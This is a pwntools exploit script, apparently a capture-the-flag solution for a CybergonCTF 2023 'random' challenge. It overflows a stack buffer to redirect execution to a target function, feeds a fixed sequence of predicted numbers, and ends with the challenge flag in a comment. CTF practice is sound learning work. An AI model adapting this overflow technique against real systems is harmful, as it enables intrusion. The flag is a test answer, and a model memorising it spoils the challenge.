#!/usr/bin/env python3

from pwn import *

p64 = lambda x: util.packing.p64(x, endian='little')
u64 = lambda x: util.packing.u64(x, endian='little')
p32 = lambda x: util.packing.p32(x, endian='little')
u32 = lambda x: util.packing.u32(x, endian='little')

exe = ELF("./random_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']


def conn():
	if args.LOCAL:
		r = process([exe.path])
	elif args.REMOTE:
		r = remote("cybergon2023.webhop.me", 5003)
	else:
		r = gdb.debug([exe.path])
	return r


def main():
	r = conn()

	offset = cyclic_find(0x6261616b6261616a)
	potato = 0x00000000004011B6
	ret = 0x0000000000401016

	payload = b''.join([
		b'A' * offset,
		p64(ret),
		p64(potato),
	])

	prompt = r.recvuntil(b'name? ')
	print(prompt)
	r.sendline(payload)


	v = [
		0xffffffe1,
		0x000000ef,
		0xffffff78,
		0x000000c9,
		0xffffff45,
		0x000000df,
		0xffffff2a,
		0xffffffa2,
		0x000000d3,
		0xffffffe4
	]

	prompt = r.recvuntil(b'numbers!')
	print(prompt)
	for number in v:
		r.sendline(str(number).encode())

	r.interactive()


if __name__ == "__main__":
	main()


# CybergonCTF{noT_RE4LlY_r4Nd0M?}
